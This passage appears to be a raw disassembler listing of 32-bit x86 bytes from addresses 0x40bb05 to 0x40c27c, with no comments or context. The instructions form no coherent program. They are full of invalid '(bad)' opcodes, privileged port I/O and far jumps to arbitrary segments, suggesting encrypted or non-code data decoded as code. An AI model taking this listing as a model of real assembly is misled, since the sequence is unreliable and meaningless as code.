  40bb05:	outs   dx,DWORD PTR ds:[esi]
  40bb06:	add    bh,bl
  40bb08:	int3   
  40bb09:	ret    
  40bb0a:	cmc    
  40bb0b:	ja     0x40bab9
  40bb0d:	sbb    BYTE PTR [ebx-0x2e],cl
  40bb10:	mov    ebp,0x5289321c
  40bb15:	or     dl,ch
  40bb17:	mov    esp,0x720ede18
  40bb1c:	pop    ss
  40bb1d:	fcom   DWORD PTR [edi-0x79]
  40bb20:	sbb    al,0x9e
  40bb22:	jp     0x40bab3
  40bb24:	push   ecx
  40bb25:	mov    al,ds:0x944cbaa1
  40bb2a:	mov    BYTE PTR [edi],dl
  40bb2c:	lods   eax,DWORD PTR ds:[esi]
  40bb2d:	pop    es
  40bb2e:	loop   0x40bb35
  40bb30:	mov    dh,0x14
  40bb32:	push   0x69
  40bb34:	out    0x36,eax
  40bb36:	xlat   BYTE PTR ds:[ebx]
  40bb37:	aad    0x51
  40bb39:	pop    ebp
  40bb3a:	xor    DWORD PTR [ebp+0x4c],0xbbc79dc5
  40bb41:	data16 mov dh,0xcf
  40bb44:	ins    DWORD PTR es:[edi],dx
  40bb45:	mov    bl,BYTE PTR [eax]
  40bb47:	aad    0x5f
  40bb49:	jge    0x40bad8
  40bb4b:	lock jb 0x40bb44
  40bb4e:	push   es
  40bb4f:	call   0x41e3:0x41ddd62b
  40bb56:	push   esp
  40bb57:	or     edx,DWORD PTR [ecx+ebx*8]
  40bb5a:	not    DWORD PTR [edx]
  40bb5c:	imul   edi,DWORD PTR [ecx],0x62
  40bb5f:	test   dh,ah
  40bb61:	data16 mov al,ds:0xa34c99dc
  40bb67:	pushf  
  40bb68:	pop    esp
  40bb69:	jo     0x40bbba
  40bb6b:	push   esi
  40bb6c:	dec    edi
  40bb6d:	push   ds
  40bb6e:	add    eax,0x3057cf0d
  40bb73:	icebp  
  40bb74:	ret    0x79d3
  40bb77:	cs inc ecx
  40bb79:	pop    ecx
  40bb7a:	mov    edx,0x2807e4ce
  40bb7f:	lods   eax,DWORD PTR ds:[esi]
  40bb80:	daa    
  40bb81:	cld    
  40bb82:	test   eax,0x97f15e05
  40bb87:	pop    esp
  40bb88:	daa    
  40bb89:	lods   eax,DWORD PTR ds:[esi]
  40bb8a:	cdq    
  40bb8b:	push   ecx
  40bb8c:	pop    ebp
  40bb8d:	stos   DWORD PTR es:[edi],eax
  40bb8e:	dec    ebx
  40bb8f:	mov    ecx,0x312f1a1b
  40bb94:	pusha  
  40bb95:	push   ebp
  40bb96:	inc    eax
  40bb97:	xchg   ecx,eax
  40bb98:	cli    
  40bb99:	pop    ss
  40bb9a:	sbb    ebp,edx
  40bb9c:	out    dx,eax
  40bb9d:	cs pop ds
  40bb9f:	and    BYTE PTR [ecx],dh
  40bba1:	inc    esp
  40bba2:	inc    esp
  40bba3:	out    0xe5,al
  40bba5:	dec    ebp
  40bba6:	pop    edx
  40bba7:	(bad)  
  40bba8:	adc    bl,BYTE PTR [edi-0x6d]
  40bbab:	xchg   esp,eax
  40bbac:	shl    DWORD PTR [ecx+0x17],1
  40bbaf:	sbb    esp,DWORD PTR [ebp-0x6c]
  40bbb2:	inc    esi
  40bbb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbb4:	mov    DWORD PTR [edi+0x4ab5e0a0],ebx
  40bbba:	mov    al,0xbc
  40bbbc:	pop    ds
  40bbbd:	mov    DWORD PTR [ecx],0x6087f6c7
  40bbc3:	ss pop eax
  40bbc5:	dec    ecx
  40bbc6:	cmp    eax,0x3fdb1595
  40bbcb:	mov    DWORD PTR [edx-0x7f],edi
  40bbce:	loope  0x40bc0f
  40bbd0:	and    BYTE PTR ds:0xa8397386,al
  40bbd6:	int3   
  40bbd7:	retf   
  40bbd8:	out    dx,eax
  40bbd9:	mov    bl,0x3a
  40bbdb:	mov    esp,DWORD PTR [esp+ebx*8+0x5a]
  40bbdf:	jge    0x40bc41
  40bbe1:	imul   ebx,DWORD PTR [eax],0x5d1d716f
  40bbe7:	sub    ch,BYTE PTR ds:0x76474b03
  40bbed:	sbb    edi,DWORD PTR [esi+0x2d706d11]
  40bbf3:	push   esp
  40bbf4:	mov    bh,0x1a
  40bbf6:	cmp    eax,0xd206856a
  40bbfb:	or     eax,0xa6100fc3
  40bc00:	pop    es
  40bc01:	call   0x93e6:0x5854340c
  40bc08:	(bad)  
  40bc09:	loop   0x40bb9e
  40bc0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc0c:	sub    BYTE PTR [ebx-0x60a9ae92],ah
  40bc12:	les    esp,FWORD PTR [esi+esi*8]
  40bc15:	ror    BYTE PTR [esi-0x3],1
  40bc18:	pop    edi
  40bc19:	dec    esp
  40bc1a:	js     0x40bbd6
  40bc1c:	(bad)  
  40bc1d:	bound  edi,QWORD PTR [edx-0x50]
  40bc20:	and    ebp,DWORD PTR [ebp-0x4164763f]
  40bc26:	(bad)  
  40bc27:	fnstenv [edx]
  40bc29:	or     dl,BYTE PTR [esi+0x4a]
  40bc2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc2d:	mov    ebp,0x12fc0e09
  40bc32:	out    dx,eax
  40bc33:	outs   dx,DWORD PTR ds:[esi]
  40bc34:	dec    ecx
  40bc35:	lds    ecx,FWORD PTR [esi+0x1]
  40bc38:	(bad)  
  40bc39:	sub    ecx,DWORD PTR [eax-0x3544cc5c]
  40bc3f:	enter  0x93a1,0xea
  40bc43:	stos   DWORD PTR es:[edi],eax
  40bc44:	xchg   edi,eax
  40bc45:	push   cs
  40bc46:	cmp    esp,DWORD PTR [ecx]
  40bc48:	push   ecx
  40bc49:	mov    cl,0x77
  40bc4b:	retf   
  40bc4c:	fistp  DWORD PTR [edx+eiz*2-0x5792f457]
  40bc53:	xor    eax,0x14110fda
  40bc58:	xor    eax,0x880fe7ee
  40bc5d:	mov    eax,0xac677577
  40bc62:	outs   dx,BYTE PTR ds:[esi]
  40bc63:	adc    BYTE PTR [edi-0x55703d64],al
  40bc69:	mov    DWORD PTR [edx],0x7b99f4da
  40bc6f:	repz aaa 
  40bc71:	add    eax,0x4e5c76f
  40bc76:	sti    
  40bc77:	adc    al,0x3
  40bc79:	jmp    0x62a6:0xdca1fad4
  40bc80:	or     ebx,0xfffffffb
  40bc83:	pop    ds
  40bc84:	cdq    
  40bc85:	cmp    dh,BYTE PTR [ebx+0x259862cc]
  40bc8b:	inc    esi
  40bc8c:	mov    esi,0x12b3ca1d
  40bc91:	inc    ebx
  40bc92:	clc    
  40bc93:	and    DWORD PTR [esi],0x71
  40bc96:	push   esp
  40bc97:	push   ecx
  40bc98:	inc    edx
  40bc99:	sub    al,0x6b
  40bc9b:	or     DWORD PTR [edx-0x1ad8473c],0xffffffac
  40bca2:	inc    ebp
  40bca3:	xchg   ebx,eax
  40bca4:	shl    BYTE PTR ds:0xe7f8dae6,1
  40bcaa:	out    dx,eax
  40bcab:	adc    al,BYTE PTR [eax]
  40bcad:	pusha  
  40bcae:	and    al,0xb6
  40bcb0:	dec    ebx
  40bcb1:	xchg   ebx,eax
  40bcb2:	pop    ss
  40bcb3:	xor    eax,0x28f08da1
  40bcb8:	sbb    BYTE PTR [eax],0x7c
  40bcbb:	int3   
  40bcbc:	aas    
  40bcbd:	stos   BYTE PTR es:[edi],al
  40bcbe:	stc    
  40bcbf:	mov    esi,0x62c7ca40
  40bcc4:	cli    
  40bcc5:	push   0x48
  40bcc7:	stc    
  40bcc8:	xchg   edx,eax
  40bcc9:	rol    DWORD PTR [ebx-0x2db8dce4],cl
  40bccf:	sbb    BYTE PTR [eax],0xfb
  40bcd2:	call   0x5b54:0x9844fb49
  40bcd9:	push   esi
  40bcda:	inc    ebp
  40bcdb:	add    edx,DWORD PTR [ecx]
  40bcdd:	in     al,dx
  40bcde:	popa   
  40bcdf:	jo     0x40bd0c
  40bce1:	mov    ?,WORD PTR [edx+0x570987b1]
  40bce7:	dec    esi
  40bce8:	jle    0x40bd65
  40bcea:	push   ecx
  40bceb:	jl     0x40bce2
  40bced:	pop    es
  40bcee:	sbb    BYTE PTR [ebp-0x2d],dl
  40bcf1:	mov    fs,ebx
  40bcf3:	add    DWORD PTR [ebx+0x35],ebx
  40bcf6:	mov    ah,0xb7
  40bcf8:	push   ecx
  40bcf9:	out    0x41,eax
  40bcfb:	dec    ebp
  40bcfc:	aas    
  40bcfd:	push   ebp
  40bcfe:	aam    0xa4
  40bd00:	ins    BYTE PTR es:[edi],dx
  40bd01:	xor    DWORD PTR [ebp+0x6c127065],edi
  40bd07:	les    edx,FWORD PTR [edi]
  40bd09:	jecxz  0x40bcea
  40bd0b:	add    DWORD PTR [edi],esi
  40bd0d:	push   ecx
  40bd0e:	inc    ebp
  40bd0f:	mov    dl,0x2
  40bd11:	sbb    DWORD PTR [eax-0x3f],eax
  40bd14:	and    bl,BYTE PTR [ebx+0x3b]
  40bd17:	jp     0x40bd32
  40bd19:	mov    cl,0x93
  40bd1b:	mov    al,0x83
  40bd1d:	inc    edi
  40bd1e:	or     ch,bh
  40bd20:	stc    
  40bd21:	pop    ebp
  40bd22:	add    eax,0x82ab5a0c
  40bd27:	or     edx,DWORD PTR [ebx]
  40bd29:	aaa    
  40bd2a:	rcl    BYTE PTR [ebp-0x741a3758],0x3a
  40bd31:	iret   
  40bd32:	sub    al,0x9
  40bd34:	xor    al,0x32
  40bd36:	cdq    
  40bd37:	jno    0x40bd84
  40bd39:	inc    edx
  40bd3a:	xchg   ebp,eax
  40bd3b:	push   esi
  40bd3c:	idiv   BYTE PTR [ebp-0xb1674e3]
  40bd42:	push   ebp
  40bd43:	test   BYTE PTR [edx-0x13],dh
  40bd46:	fsub   st,st(5)
  40bd48:	ds (bad) 
  40bd4a:	sbb    eax,0x1540d
  40bd4f:	mov    edx,0x9c584794
  40bd54:	adc    DWORD PTR [edx],eax
  40bd56:	pop    ebp
  40bd57:	sub    DWORD PTR [ecx+0x2d],esp
  40bd5a:	cmp    esi,ebp
  40bd5c:	xchg   ecx,eax
  40bd5d:	add    dh,BYTE PTR [edx]
  40bd5f:	sub    al,BYTE PTR [eax]
  40bd61:	jmp    0x8f42b426
  40bd66:	cmp    ecx,DWORD PTR [esp+edi*1]
  40bd69:	fimul  DWORD PTR [eax+edx*1+0x3f]
  40bd6d:	jmp    0x40bd77
  40bd6f:	push   ebp
  40bd70:	and    eax,0x6bb8e7cf
  40bd75:	push   0xe546cc54
  40bd7a:	rcr    DWORD PTR [ebx+0x16],cl
  40bd7d:	sbb    bh,BYTE PTR [ebp-0x7]
  40bd80:	mov    eax,ds:0x1ff981ed
  40bd85:	jnp    0x40bd1e
  40bd87:	shl    DWORD PTR [ebp+0x4d],0x85
  40bd8b:	mov    bh,0x57
  40bd8d:	dec    ebx
  40bd8e:	inc    edx
  40bd8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd90:	adc    dh,ah
  40bd92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd93:	test   BYTE PTR [ebp-0x4eaae107],al
  40bd99:	repnz pop es
  40bd9b:	mov    ch,BYTE PTR [edx]
  40bd9d:	mov    ds:0xcc3207fd,eax
  40bda2:	stos   BYTE PTR es:[edi],al
  40bda3:	cmp    eax,0x7aa830e2
  40bda8:	mov    edi,0xbd6133e0
  40bdad:	shl    DWORD PTR [ebx-0x508a8c69],1
  40bdb3:	and    BYTE PTR [esi],bh
  40bdb5:	add    ch,BYTE PTR [edi]
  40bdb7:	sbb    cl,BYTE PTR [ecx-0x41a23ba5]
  40bdbd:	in     al,0xe6
  40bdbf:	fs (bad) 
  40bdc1:	shl    BYTE PTR ds:0xa1ebbbd8,1
  40bdc7:	adc    dh,BYTE PTR [esi+ecx*2-0x5c]
  40bdcb:	js     0x40bddd
  40bdcd:	std    
  40bdce:	imul   ecx,DWORD PTR ds:0xd3f442de,0xffffffb8
  40bdd5:	and    al,0x2e
  40bdd7:	scas   al,BYTE PTR es:[edi]
  40bdd8:	add    BYTE PTR [ecx-0x35],ah
  40bddb:	out    0x1f,eax
  40bddd:	xor    BYTE PTR [esi],dl
  40bddf:	and    esi,DWORD PTR [edi+0x3a]
  40bde2:	jne    0x40be02
  40bde4:	add    DWORD PTR [esi-0x46],eax
  40bde7:	push   es
  40bde8:	sub    BYTE PTR ss:[edx+0x3b],0x81
  40bded:	jae    0x40bda9
  40bdef:	loope  0x40be02
  40bdf1:	push   esi
  40bdf2:	cli    
  40bdf3:	mov    dh,0x25
  40bdf5:	ja     0x40be6b
  40bdf7:	js     0x40bdcb
  40bdf9:	stc    
  40bdfa:	mov    ebp,0x52c614bf
  40bdff:	(bad)  
  40be00:	lods   al,BYTE PTR ds:[esi]
  40be01:	inc    esi
  40be02:	sbb    BYTE PTR [edx+0x4f],ch
  40be05:	push   ebp
  40be06:	sar    ebp,cl
  40be08:	push   0xea8b5fd4
  40be0d:	aaa    
  40be0e:	fsub   DWORD PTR [ebx+eax*8]
  40be11:	jle    0x40bddb
  40be13:	cmp    DWORD PTR [edi],ebx
  40be15:	cmp    DWORD PTR [esi-0x52],0xff746f1d
  40be1c:	xor    esp,esi
  40be1e:	or     eax,0xfdcf0921
  40be23:	fild   WORD PTR [ebx-0x26]
  40be26:	iret   
  40be27:	mov    ds:0xd13b9658,al
  40be2c:	fcomi  st,st(2)
  40be2e:	or     cl,0x1e
  40be31:	ja     0x40be06
  40be33:	retf   0xea96
  40be36:	dec    ebp
  40be37:	jno    0x40bdc7
  40be39:	mov    esi,0x3898fd14
  40be3e:	lods   al,BYTE PTR ds:[esi]
  40be3f:	sti    
  40be40:	jl     0x40be52
  40be42:	imul   edi,DWORD PTR [edx],0x32
  40be45:	sbb    edi,DWORD PTR [esi+0x22f63b6f]
  40be4b:	out    0xc6,eax
  40be4d:	dec    cl
  40be4f:	fcom   QWORD PTR [ecx+esi*8-0x2950c8a7]
  40be56:	or     edx,DWORD PTR [edi+0x6fccaedb]
  40be5c:	mov    eax,ds:0xe1438c23
  40be61:	cmp    al,0x6f
  40be63:	dec    ebp
  40be64:	adc    BYTE PTR [eax-0x45],0x4b
  40be68:	jbe    0x40beb4
  40be6a:	ror    DWORD PTR [edx+edx*1+0x12],0x6b
  40be6f:	mov    ds:0x9ba11369,al
  40be74:	ja     0x40bebb
  40be76:	fwait
  40be77:	enter  0x376,0xba
  40be7b:	mov    eax,ds:0x1923f100
  40be80:	mov    ds:0x99e705d7,eax
  40be85:	mov    ch,0x5f
  40be87:	call   0xb2e3:0xeb795ce9
  40be8e:	popf   
  40be8f:	ja     0x40be44
  40be91:	jecxz  0x40bede
  40be93:	sti    
  40be94:	aam    0x2
  40be96:	pushf  
  40be97:	mov    ds:0x238474cb,al
  40be9c:	add    bh,ah
  40be9e:	popf   
  40be9f:	dec    esi
  40bea0:	scas   al,BYTE PTR es:[edi]
  40bea1:	mov    edx,0xed4ebb56
  40bea6:	fnsave [esi+0x7]
  40bea9:	mov    dh,0x5f
  40beab:	mov    eax,0x5f4f4e67
  40beb0:	ja     0x40bede
  40beb2:	enter  0x5b3c,0xd8
  40beb6:	and    eax,0x4499410f
  40bebb:	jae    0x40bf2a
  40bebd:	push   edx
  40bebe:	loopne 0x40bec2
  40bec0:	imul   edi,DWORD PTR [ecx-0x70],0x2162a7e5
  40bec7:	loop   0x40bef2
  40bec9:	int    0xa4
  40becb:	adc    bl,BYTE PTR [ebx]
  40becd:	popa   
  40bece:	iret   
  40becf:	ss mov cs,edx
  40bed2:	popa   
  40bed3:	pusha  
  40bed4:	pop    es
  40bed5:	push   ebx
  40bed6:	icebp  
  40bed7:	push   esp
  40bed8:	retf   0xcb0d
  40bedb:	mov    ebp,0x6e78f590
  40bee0:	inc    esp
  40bee1:	es or  al,0xa0
  40bee4:	les    ebp,FWORD PTR [eax]
  40bee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bee7:	ret    0x82c5
  40beea:	jne    0x40befa
  40beec:	mov    dl,ah
  40beee:	or     al,0xc0
  40bef0:	fisub  DWORD PTR [ebp+0x627163ea]
  40bef6:	ror    DWORD PTR ds:0x4a1a44e1,1
  40befc:	inc    ebp
  40befd:	shl    DWORD PTR [ecx+0x309c40f],1
  40bf03:	add    ebx,esp
  40bf05:	mov    eax,ds:0x7f9d833f
  40bf0a:	jge    0x40beeb
  40bf0c:	add    al,0xf6
  40bf0e:	ins    DWORD PTR es:[edi],dx
  40bf0f:	jle    0x40bf18
  40bf11:	jae    0x40bed7
  40bf13:	pop    ebp
  40bf14:	gs in  eax,0xf2
  40bf17:	inc    esi
  40bf18:	ret    
  40bf19:	jmp    0x27ac:0x927fb4af
  40bf20:	ror    BYTE PTR [esi],1
  40bf22:	pop    ecx
  40bf23:	jp     0x40bf47
  40bf25:	in     eax,0x44
  40bf27:	mov    ebp,0xba5aef3e
  40bf2c:	or     esp,eax
  40bf2e:	hlt    
  40bf2f:	xchg   eax,eax
  40bf31:	adc    eax,0x7ebf17bf
  40bf36:	sub    eax,0x2c4bd517
  40bf3b:	clc    
  40bf3c:	mov    ebp,0x1c9726dd
  40bf41:	les    esp,FWORD PTR [edx]
  40bf43:	pop    ebp
  40bf44:	ja     0x40bf45
  40bf46:	mov    ?,WORD PTR [esi]
  40bf48:	mov    esi,DWORD PTR [eax+0x6554c006]
  40bf4e:	push   esi
  40bf4f:	adc    al,0x89
  40bf51:	scas   eax,DWORD PTR es:[edi]
  40bf52:	push   cs
  40bf53:	or     BYTE PTR [ecx-0x1],bh
  40bf56:	xchg   edx,eax
  40bf57:	pcmpgtb mm6,mm4
  40bf5a:	jmp    0xd4cb5d5d
  40bf5f:	(bad)  
  40bf60:	pop    ebx
  40bf61:	dec    eax
  40bf62:	or     eax,0xe6206156
  40bf67:	cmp    ch,BYTE PTR [edi-0x32]
  40bf6a:	and    eax,0xa043b57a
  40bf6f:	mov    bl,0xb3
  40bf71:	cmc    
  40bf72:	sbb    dl,dl
  40bf74:	inc    eax
  40bf75:	push   esp
  40bf76:	popa   
  40bf77:	push   ds
  40bf78:	mov    eax,0x7fd31383
  40bf7d:	int    0x12
  40bf7f:	js     0x40bf1a
  40bf81:	add    BYTE PTR [ecx-0x575cf471],ch
  40bf87:	psllw  mm4,QWORD PTR [esp+edx*1-0xaef431e]
  40bf8f:	inc    edx
  40bf90:	inc    eax
  40bf91:	inc    ecx
  40bf92:	out    0xbd,al
  40bf94:	arpl   WORD PTR [edi+0x67],dx
  40bf97:	dec    edi
  40bf98:	mov    dl,0xeb
  40bf9a:	leave  
  40bf9b:	in     al,dx
  40bf9c:	leave  
  40bf9d:	mov    ds:0x3c3b53f7,al
  40bfa2:	js     0x40bfb6
  40bfa4:	push   0xffffffc3
  40bfa6:	adc    edi,edx
  40bfa8:	bound  ebp,QWORD PTR [edx+0x3f64edb8]
  40bfae:	mov    eax,0xb5bacbab
  40bfb3:	ret    
  40bfb4:	ret    
  40bfb5:	mov    esi,0x5f191359
  40bfba:	loop   0x40c00d
  40bfbc:	inc    ebx
  40bfbd:	jnp    0x40bf70
  40bfbf:	out    dx,eax
  40bfc0:	sbb    al,0xec
  40bfc2:	aaa    
  40bfc3:	push   eax
  40bfc4:	cmp    dl,bl
  40bfc6:	loopne 0x40bfc0
  40bfc8:	xor    dh,dh
  40bfca:	repz xlat BYTE PTR ds:[ebx]
  40bfcc:	stc    
  40bfcd:	(bad)  
  40bfce:	shr    DWORD PTR [edi],1
  40bfd0:	loop   0x40c036
  40bfd2:	push   0xffffffca
  40bfd4:	xchg   ebx,eax
  40bfd5:	jbe    0x40bf70
  40bfd7:	xchg   ebx,eax
  40bfd8:	out    dx,al
  40bfd9:	push   eax
  40bfda:	sub    dh,BYTE PTR [edi+0x452efc59]
  40bfe0:	push   es
  40bfe1:	jbe    0x40c000
  40bfe3:	or     al,0x79
  40bfe5:	push   esi
  40bfe6:	mov    ds,WORD PTR [edi-0x69eabb51]
  40bfec:	int3   
  40bfed:	sub    al,0x56
  40bfef:	pop    ecx
  40bff0:	mov    eax,0x5b32fb35
  40bff5:	and    BYTE PTR [edi+eiz*2-0x8d68d0],al
  40bffc:	push   esp
  40bffd:	js     0x40bfb0
  40bfff:	cmp    al,0x83
  40c001:	(bad)  
  40c004:	leave  
  40c005:	or     BYTE PTR ds:0xa9873479,bh
  40c00b:	retf   0x42c
  40c00e:	fdivrp st(3),st
  40c010:	push   esi
  40c011:	mov    edi,0x674463f8
  40c016:	cs aam 0xd4
  40c019:	mov    edx,0xb0d5e034
  40c01f:	enter  0x6a15,0xe8
  40c023:	jecxz  0x40c050
  40c025:	daa    
  40c026:	sub    dh,cl
  40c028:	adc    DWORD PTR [eax-0x5ac36c80],esi
  40c02e:	shl    ebp,cl
  40c030:	inc    ebp
  40c031:	xchg   esp,eax
  40c032:	mov    ?,WORD PTR [edx-0x30ca1253]
  40c038:	arpl   WORD PTR [ebx+0x7d],bp
  40c03b:	lods   eax,DWORD PTR ds:[esi]
  40c03c:	and    BYTE PTR [ebp-0x1389c880],ah
  40c042:	pop    ebp
  40c043:	ins    BYTE PTR es:[edi],dx
  40c044:	sub    edx,0x21
  40c047:	cmp    DWORD PTR [edx-0x3a],0xffffff81
  40c04b:	dec    ecx
  40c04c:	pop    es
  40c04d:	imul   DWORD PTR [ebp+0x34c16a07]
  40c053:	call   0x9ef25d7
  40c058:	or     ebx,ebp
  40c05a:	jmp    0xbc0787a7
  40c05f:	mov    bh,0xdf
  40c061:	cmp    esi,DWORD PTR [edx-0x2c0a9f61]
  40c067:	fsub   QWORD PTR [edi+0x4a]
  40c06a:	outs   dx,BYTE PTR ds:[esi]
  40c06b:	enter  0x154b,0x86
  40c06f:	mov    ebp,0x39561da9
  40c074:	je     0x40c080
  40c076:	add    BYTE PTR [eax-0x5d],al
  40c079:	ficom  WORD PTR [esi-0x3417f5ce]
  40c07f:	std    
  40c080:	test   DWORD PTR [edi+ecx*8],ecx
  40c083:	cli    
  40c084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c085:	pop    edi
  40c086:	or     bh,BYTE PTR [ecx]
  40c088:	sub    esp,ecx
  40c08a:	or     DWORD PTR [ebx+0x5],eax
  40c08d:	mov    DWORD PTR [ebx+0x782bffb0],eax
  40c093:	mov    fs,ebp
  40c095:	pop    ebp
  40c096:	add    eax,edi
  40c098:	and    al,0xdd
  40c09a:	cli    
  40c09b:	popf   
  40c09c:	rcr    BYTE PTR [eax+eax*2],1
  40c09f:	pushf  
  40c0a0:	sar    ah,cl
  40c0a2:	cdq    
  40c0a3:	pop    DWORD PTR [esi]
  40c0a5:	fsub   QWORD PTR [edx]
  40c0a7:	adc    edi,DWORD PTR [ebx-0x4b0d955e]
  40c0ad:	lea    ecx,[edx-0x36dab67]
  40c0b3:	rol    eax,cl
  40c0b5:	addr16 sbb esi,edi
  40c0b8:	gs push ebx
  40c0ba:	mov    eax,0xe10e4038
  40c0bf:	push   es
  40c0c0:	push   esp
  40c0c1:	nop
  40c0c2:	sbb    eax,DWORD PTR [ebp-0x6b90dd79]
  40c0c8:	push   0x3ab7249f
  40c0cd:	jl     0x40c0eb
  40c0cf:	in     eax,0xb9
  40c0d1:	and    eax,0x6c155cfc
  40c0d6:	pop    eax
  40c0d7:	in     eax,dx
  40c0d8:	scas   eax,DWORD PTR es:[edi]
  40c0d9:	mov    eax,ds:0x54fc1e0a
  40c0de:	sbb    dl,BYTE PTR [edx-0x44]
  40c0e1:	xchg   esi,eax
  40c0e2:	pop    esp
  40c0e3:	aam    0xcb
  40c0e5:	lds    ebx,FWORD PTR [esi+esi*8]
  40c0e8:	lods   al,BYTE PTR ds:[esi]
  40c0e9:	xor    al,0x3e
  40c0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0ec:	pop    edx
  40c0ed:	fwait
  40c0ee:	pop    ds
  40c0ef:	push   es
  40c0f0:	sbb    BYTE PTR [eax-0x1e],dl
  40c0f3:	aam    0xf9
  40c0f5:	and    BYTE PTR [ebp-0x40],cl
  40c0f8:	xchg   ebp,eax
  40c0f9:	and    ecx,0x15
  40c0fc:	clc    
  40c0fd:	jno    0x40c158
  40c0ff:	sbb    DWORD PTR [ebx+esi*1+0x6b80756f],esi
  40c106:	push   ds
  40c107:	mov    eax,0x4f70edf8
  40c10c:	sbb    ecx,esi
  40c10e:	or     edx,DWORD PTR [ebp-0x35]
  40c111:	call   0x5cb:0xefe13ca3
  40c118:	and    al,0xc7
  40c11a:	aas    
  40c11b:	test   BYTE PTR [ecx*2-0x5cfa7406],0x86
  40c123:	or     DWORD PTR [edi],eax
  40c125:	pop    ebx
  40c126:	fwait
  40c127:	stos   DWORD PTR es:[edi],eax
  40c128:	stos   DWORD PTR es:[edi],eax
  40c129:	xchg   ecx,eax
  40c12a:	shr    DWORD PTR [esi+0x62],0x12
  40c12e:	or     eax,0x81470532
  40c133:	inc    edi
  40c134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c135:	inc    edi
  40c136:	and    ebp,DWORD PTR [edi]
  40c138:	cdq    
  40c139:	push   ebp
  40c13a:	test   al,0x98
  40c13c:	pop    es
  40c13d:	add    al,0x38
  40c13f:	and    al,0x79
  40c141:	sbb    DWORD PTR [ebp*1+0x2f67b57],esi
  40c148:	mov    esi,0xb08b4f70
  40c14d:	ss out 0x7,eax
  40c150:	ds mov bl,0x3c
  40c153:	aaa    
  40c154:	push   ds
  40c155:	push   edx
  40c156:	pop    ss
  40c157:	mov    WORD PTR [edi],ds
  40c159:	test   eax,0xdd807a81
  40c15e:	bound  edx,QWORD PTR [edi+0x3ae4a7b6]
  40c164:	loopne 0x40c1d5
  40c166:	les    esp,FWORD PTR [eax+0x1e]
  40c169:	jb     0x40c143
  40c16b:	adc    bl,bh
  40c16d:	loopne 0x40c171
  40c16f:	sbb    al,0x82
  40c171:	rol    bh,1
  40c173:	sbb    al,0x60
  40c175:	sub    al,0xdc
  40c177:	mov    eax,0x82b7e08d
  40c17c:	and    ecx,DWORD PTR [esi-0x3c03ac3d]
  40c182:	sbb    BYTE PTR [eax-0x72],bh
  40c185:	xchg   DWORD PTR [edi+ebx*4-0x5a],edi
  40c189:	cmp    ebp,edx
  40c18b:	and    al,0x12
  40c18d:	int3   
  40c18e:	adc    al,0xca
  40c190:	xor    eax,0x8a56a01f
  40c195:	or     cl,ah
  40c197:	mov    dh,0x34
  40c199:	fiadd  DWORD PTR [edi+ebp*2+0x25]
  40c19d:	xor    eax,DWORD PTR [ecx]
  40c19f:	xor    DWORD PTR [ecx],ebp
  40c1a1:	cli    
  40c1a2:	cmp    DWORD PTR [ebx],edi
  40c1a4:	cdq    
  40c1a5:	out    dx,al
  40c1a6:	ja     0x40c182
  40c1a8:	in     al,0x82
  40c1aa:	mov    al,BYTE PTR [edi+0x54]
  40c1ad:	bound  esp,QWORD PTR [ebx]
  40c1af:	mov    ebp,0xac2d542f
  40c1b4:	enter  0x4ddc,0x52
  40c1b8:	adc    eax,0x6454e2a6
  40c1bd:	aad    0x2b
  40c1bf:	in     al,dx
  40c1c0:	mov    dl,0xfd
  40c1c2:	dec    edx
  40c1c3:	les    eax,FWORD PTR [esi+esi*4-0x24db7500]
  40c1ca:	push   0xffffffac
  40c1cc:	rol    DWORD PTR [eax+0x1d0b2d7b],1
  40c1d2:	push   0xfffffff0
  40c1d4:	cdq    
  40c1d5:	clc    
  40c1d6:	xchg   esi,eax
  40c1d7:	test   ebx,ecx
  40c1d9:	mov    DWORD PTR [eiz*2+0x63a22c21],esp
  40c1e0:	jne    0x40c196
  40c1e2:	idiv   ch
  40c1e4:	test   BYTE PTR [edi-0x572062b7],0x40
  40c1eb:	repz jp 0x40c267
  40c1ee:	out    dx,eax
  40c1ef:	test   eax,0xc36ae72b
  40c1f4:	rcl    DWORD PTR [eax],cl
  40c1f6:	mov    ecx,0x39c31406
  40c1fb:	aas    
  40c1fc:	mov    ss,WORD PTR [edi]
  40c1fe:	xor    BYTE PTR [ebp+0x48],dl
  40c201:	lahf   
  40c202:	loopne 0x40c1fc
  40c204:	ret    
  40c205:	aaa    
  40c206:	sub    al,0x96
  40c208:	jecxz  0x40c23e
  40c20a:	ret    0x828a
  40c20d:	ror    BYTE PTR [edx+0x33],0xb8
  40c211:	(bad)
  40c214:	jp     0x40c1d7
  40c216:	jnp    0x40c1f8
  40c218:	mov    ebp,0xaa0fa942
  40c21d:	cmc    
  40c21e:	retf   
  40c21f:	cmp    DWORD PTR [esi+0x7faabb7],edx
  40c225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c226:	sbb    esi,ebp
  40c228:	push   edi
  40c229:	call   0xed024a1a
  40c22e:	test   BYTE PTR [edx-0x15c228e4],bh
  40c234:	nop
  40c235:	pop    edi
  40c236:	mov    WORD PTR [edx+0x607c00dc],es
  40c23c:	or     DWORD PTR [edi+edx*4],esi
  40c23f:	mov    edi,0xd027446b
  40c244:	xchg   DWORD PTR [eax-0x7065ee5b],eax
  40c24a:	pop    ds
  40c24b:	outs   dx,BYTE PTR ds:[esi]
  40c24c:	adc    dl,BYTE PTR [edx]
  40c24e:	test   edi,edx
  40c250:	push   eax
  40c251:	mov    bl,0xdb
  40c253:	mov    WORD PTR [ebx+0x410be814],cs
  40c259:	int    0xdb
  40c25b:	mov    ?,WORD PTR ds:0x571dd1d3
  40c261:	div    ecx
  40c263:	adc    ah,BYTE PTR [ebp+0x4a]
  40c266:	xchg   ecx,eax
  40c267:	sbb    BYTE PTR [ebp+ebx*4+0x1367d1fa],0x4
  40c26f:	nop
  40c270:	mov    ebp,0x475f4039
  40c275:	or     bh,BYTE PTR [esp+esi*1+0x6fd5a21b]
  40c27c:	xchg   esp,eax
